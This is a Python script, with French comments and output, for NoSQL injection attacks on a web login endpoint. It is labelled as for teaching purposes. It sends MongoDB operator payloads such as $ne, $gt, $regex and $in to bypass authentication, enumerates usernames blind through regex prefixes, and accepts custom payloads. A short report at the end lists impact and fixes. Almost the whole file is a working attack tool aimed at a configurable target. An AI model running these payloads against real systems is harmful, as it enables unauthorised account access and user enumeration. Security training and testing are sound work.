#!/usr/bin/env python3
"""
Attaque NoSQL Injection améliorée
Avec support Ngrok et analyse détaillée
"""

import requests
import json
from colorama import Fore, Style, init
from config import get_target_url, load_config

init(autoreset=True)


def banner():
    print(f"""
{Fore.MAGENTA}╔═══════════════════════════════════════════════════╗
║       💉 NOSQL INJECTION ATTACK v2.0             ║
║              POUR TESTS PÉDAGOGIQUES              ║
╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}
""")


class InjectionAnalyzer:
    """Analyse les résultats des injections"""
    
    def __init__(self):
        self.total_tests = 0
        self.successful_injections = []
        self.failed_injections = []
        self.errors = []
    
    def add_result(self, injection_type, payload, success, response_data=None, error=None):
        """Ajoute un résultat"""
        self.total_tests += 1
        
        if error:
            self.errors.append({
                'type': injection_type,
                'payload': payload,
                'error': error
            })
        elif success:
            self.successful_injections.append({
                'type': injection_type,
                'payload': payload,
                'response': response_data
            })
        else:
            self.failed_injections.append({
                'type': injection_type,
                'payload': payload
            })
    
    def print_summary(self):
        """Affiche le résumé"""
        print(f"\n{Fore.CYAN}╔═══════════════ RAPPORT D'INJECTION ═══════════════╗{Style.RESET_ALL}")
        
        print(f"\n{Fore.WHITE}📊 STATISTIQUES:{Style.RESET_ALL}")
        print(f"  • Tests effectués: {self.total_tests}")
        print(f"  • Injections réussies: {Fore.GREEN}{len(self.successful_injections)}{Style.RESET_ALL}")
        print(f"  • Injections échouées: {Fore.YELLOW}{len(self.failed_injections)}{Style.RESET_ALL}")
        print(f"  • Erreurs: {Fore.RED}{len(self.errors)}{Style.RESET_ALL}")
        
        if self.total_tests > 0:
            success_rate = (len(self.successful_injections) / self.total_tests) * 100
            print(f"  • Taux de succès: {Fore.GREEN}{success_rate:.1f}%{Style.RESET_ALL}")
        
        if self.successful_injections:
            print(f"\n{Fore.GREEN}✓ INJECTIONS RÉUSSIES:{Style.RESET_ALL}")
            for inj in self.successful_injections:
                print(f"  • {inj['type']}")
                if 'username' in inj.get('response', {}):
                    print(f"    → Connecté en tant que: {Fore.CYAN}{inj['response']['username']}{Style.RESET_ALL}")
        
        # Analyse de vulnérabilité
        print(f"\n{Fore.CYAN}🔐 ANALYSE DE SÉCURITÉ:{Style.RESET_ALL}")
        
        if len(self.successful_injections) > 0:
            print(f"  {Fore.RED}⚠️  SYSTÈME VULNÉRABLE À NOSQL INJECTION{Style.RESET_ALL}")
            print(f"  {Fore.RED}   → {len(self.successful_injections)} bypass réussi(s){Style.RESET_ALL}")
            print(f"\n  {Fore.YELLOW}Impact:{Style.RESET_ALL}")
            print(f"    • Bypass de l'authentification")
            print(f"    • Accès non autorisé aux comptes")
            print(f"    • Énumération possible des utilisateurs")
            print(f"\n  {Fore.YELLOW}Recommandations:{Style.RESET_ALL}")
            print(f"    • Valider que les inputs sont des strings")
            print(f"    • Utiliser un ORM sécurisé")
            print(f"    • Ne jamais passer directement les inputs à MongoDB")
        else:
            print(f"  {Fore.GREEN}✓ SYSTÈME PROTÉGÉ{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}   → Aucune injection n'a réussi{Style.RESET_ALL}")


def test_injection(url, payload_username, payload_password, description, timeout=10):
    """Teste une payload d'injection NoSQL"""
    print(f"\n{Fore.CYAN}[*] Test: {description}{Style.RESET_ALL}")
    print(f"    Username: {json.dumps(payload_username)}")
    print(f"    Password: {json.dumps(payload_password)}")
    
    try:
        response = requests.post(
            url,
            json={
                "username": payload_username,
                "password": payload_password
            },
            headers={"Content-Type": "application/json"},
            timeout=timeout
        )
        
        print(f"    Status: {response.status_code}")
        
        try:
            data = response.json()
        except json.JSONDecodeError:
            print(f"{Fore.RED}    [✗] Réponse invalide (pas de JSON){Style.RESET_ALL}")
            return False, None, "Invalid JSON"
        
        if response.status_code == 200 and data.get('success'):
            print(f"{Fore.GREEN}    [✓] INJECTION RÉUSSIE !{Style.RESET_ALL}")
            print(f"    Message: {data.get('message')}")
            if 'username' in data:
                print(f"    User: {Fore.CYAN}{data.get('username')}{Style.RESET_ALL}")
            return True, data, None
        else:
            print(f"{Fore.YELLOW}    [!] Injection échouée{Style.RESET_ALL}")
            return False, data, None
    
    except requests.exceptions.Timeout:
        print(f"{Fore.RED}    [✗] Timeout{Style.RESET_ALL}")
        return False, None, "Timeout"
    except requests.exceptions.ConnectionError:
        print(f"{Fore.RED}    [✗] Erreur de connexion{Style.RESET_ALL}")
        return False, None, "Connection Error"
    except Exception as e:
        print(f"{Fore.RED}    [✗] Erreur: {str(e)}{Style.RESET_ALL}")
        return False, None, str(e)


def basic_injections(url):
    """Teste les injections NoSQL de base"""
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║          📋 INJECTIONS NOSQL DE BASE             ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    analyzer = InjectionAnalyzer()
    
    injections = [
        {
            "username": {"$ne": None},
            "password": {"$ne": None},
            "description": "Bypass avec $ne (not equal) - Valeurs non null"
        },
        {
            "username": {"$ne": ""},
            "password": {"$ne": ""},
            "description": "Bypass avec $ne - Valeurs non vides"
        },
        {
            "username": {"$gt": ""},
            "password": {"$gt": ""},
            "description": "Bypass avec $gt (greater than)"
        },
        {
            "username": {"$regex": ".*"},
            "password": {"$regex": ".*"},
            "description": "Bypass avec $regex - Match tout"
        },
        {
            "username": {"$exists": True},
            "password": {"$exists": True},
            "description": "Bypass avec $exists"
        },
        {
            "username": "admin",
            "password": {"$ne": None},
            "description": "Cibler 'admin' avec n'importe quel password"
        },
        {
            "username": {"$in": ["admin", "root", "user"]},
            "password": {"$ne": ""},
            "description": "Cibler plusieurs usernames avec $in"
        },
    ]
    
    for i, injection in enumerate(injections, 1):
        print(f"\n{Fore.WHITE}{'═' * 60}")
        print(f"Injection #{i}/{len(injections)}")
        print(f"{'═' * 60}{Style.RESET_ALL}")
        
        success, data, error = test_injection(
            url,
            injection["username"],
            injection["password"],
            injection["description"]
        )
        
        analyzer.add_result(
            injection["description"],
            injection,
            success,
            data,
            error
        )
    
    analyzer.print_summary()
    return analyzer


def advanced_injections(url):
    """Injections avancées"""
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║         🎯 INJECTIONS NOSQL AVANCÉES             ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    analyzer = InjectionAnalyzer()
    
    advanced_payloads = [
        {
            "username": {"$nin": [""]},
            "password": {"$nin": [""]},
            "description": "Bypass avec $nin (not in)"
        },
        {
            "username": {"$regex": "^a"},
            "password": {"$ne": ""},
            "description": "Énumération - Usernames commençant par 'a'"
        },
        {
            "username": {"$regex": "^admin"},
            "password": {"$ne": ""},
            "description": "Cibler les usernames commençant par 'admin'"
        }
    ]
    
    for i, payload in enumerate(advanced_payloads, 1):
        print(f"\n{Fore.WHITE}{'═' * 60}")
        print(f"Injection avancée #{i}/{len(advanced_payloads)}")
        print(f"{'═' * 60}{Style.RESET_ALL}")
        
        success, data, error = test_injection(
            url,
            payload["username"],
            payload["password"],
            payload["description"]
        )
        
        analyzer.add_result(
            payload["description"],
            payload,
            success,
            data,
            error
        )
    
    analyzer.print_summary()
    return analyzer


def blind_injection(url):
    """Injection en aveugle pour énumération"""
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║      🕵️  BLIND INJECTION (ÉNUMÉRATION)           ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}[*] Tentative d'énumération des usernames...{Style.RESET_ALL}\n")
    
    # Tester les premiers caractères
    common_prefixes = ['a', 'ad', 'adm', 'admin', 'r', 'ro', 'roo', 'root', 'u', 'us', 'use', 'user', 't', 'te', 'test']
    
    found_users = []
    
    for prefix in common_prefixes[:8]:  # Limiter pour ne pas spammer
        payload_username = {"$regex": f"^{prefix}"}
        payload_password = {"$ne": None}
        
        success, data, error = test_injection(
            url,
            payload_username,
            payload_password,
            f"Username commençant par '{prefix}'"
        )
        
        if success:
            print(f"{Fore.GREEN}    [✓] Trouvé ! Un username commence par: {prefix}{Style.RESET_ALL}")
            found_users.append(prefix)
    
    if found_users:
        print(f"\n{Fore.GREEN}[✓] Préfixes découverts: {', '.join(found_users)}{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.YELLOW}[!] Aucun préfixe trouvé{Style.RESET_ALL}")


def custom_injection(url):
    """Injection personnalisée"""
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║          🛠️  INJECTION PERSONNALISÉE              ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    print(f"\n{Fore.WHITE}Exemples de payloads:")
    print('  • {{"$ne": null}}')
    print('  • {{"$gt": ""}}')
    print('  • {{"$regex": "^admin"}}')
    print('  • "admin" (valeur normale){Style.RESET_ALL}\n')
    
    username_input = input(f"{Fore.CYAN}Payload username (JSON ou texte): {Style.RESET_ALL}")
    password_input = input(f"{Fore.CYAN}Payload password (JSON ou texte): {Style.RESET_ALL}")
    
    # Parser en JSON si possible
    try:
        username_payload = json.loads(username_input)
    except:
        username_payload = username_input
    
    try:
        password_payload = json.loads(password_input)
    except:
        password_payload = password_input
    
    test_injection(url, username_payload, password_payload, "Injection personnalisée")


def main():
    banner()
    
    # Charger ou demander la configuration
    config = load_config()
    if not config:
        print(f"{Fore.YELLOW}[!] Aucune configuration trouvée{Style.RESET_ALL}")
        config = get_target_url()
    
    TARGET_URL = config['login_endpoint']
    
    print(f"\n{Fore.GREEN}[✓] Cible configurée: {TARGET_URL}{Style.RESET_ALL}")
    
    print(f"""
{Fore.WHITE}Sélectionnez le type d'attaque:
1. Injections NoSQL de base (bypass auth)
2. Injections avancées
3. Blind injection (énumération)
4. Injection personnalisée
5. Toutes les attaques
6. Quitter{Style.RESET_ALL}
""")
    
    choice = input(f"{Fore.CYAN}Votre choix (1-6): {Style.RESET_ALL}")
    
    if choice == "1":
        basic_injections(TARGET_URL)
    elif choice == "2":
        advanced_injections(TARGET_URL)
    elif choice == "3":
        blind_injection(TARGET_URL)
    elif choice == "4":
        custom_injection(TARGET_URL)
    elif choice == "5":
        basic_injections(TARGET_URL)
        advanced_injections(TARGET_URL)
        blind_injection(TARGET_URL)
    elif choice == "6":
        print(f"{Fore.CYAN}[*] Au revoir !{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[✗] Choix invalide{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Attaque interrompue{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[✗] Erreur: {str(e)}{Style.RESET_ALL}")